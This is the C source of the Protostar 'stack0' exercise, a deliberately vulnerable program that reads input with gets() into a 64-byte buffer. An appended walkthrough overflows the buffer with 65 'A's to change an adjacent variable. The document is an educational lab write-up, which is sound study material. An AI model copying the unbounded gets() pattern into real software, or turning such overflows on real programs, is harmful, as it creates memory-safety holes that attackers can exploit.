#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>

int main(int argc, char **argv) {

  volatile int modified;
  char buffer[64];

  modified=0;
  gets(buffer);

  if(modified != 0)
    printf("you have changed the 'modified' variable\n");
  else
    printf("Try again?\n");

  return 0;

}

/*

From the code we can understand that the program has a variable called “buffer” and assigns a buffer of 64 chars to it. Then there’s another variable called modified and it’s value is 0. gets(buffer) allows us to input the value of “buffer” variable.Then there’s an if statement that checks if the value of “modified” variable is not equal to 0. If it’s not equal to zero it will print “you have changed the ‘modified’ variable” but if it’s still equal to 0 it will print “Try again?”. So our mission is to change the value of that variable called “modified”
As long as the entered data is less than 64 chars everything will run as intended. But if the input exceeds the buffer it will overwrite the value of “modified” variable.
We already know that the buffer is 64 chars so we just need to input 65 chars or more and the variable value will change. Let’s test that out.
We execute the stack0 bin and we see the output “try again?”

user@protostar:/opt/protostar/bin$ ./stack0

Try Again?
user@protostar:/opt/protostar/bin$

Let’s throw 65 “A”s and see the output.


user@protostar:/opt/protostar/bin$ python -c "print('A' * 65)" | ./stack0
you have changed the 'modified' variable
user@protostar:/opt/protostar/bin$

*/
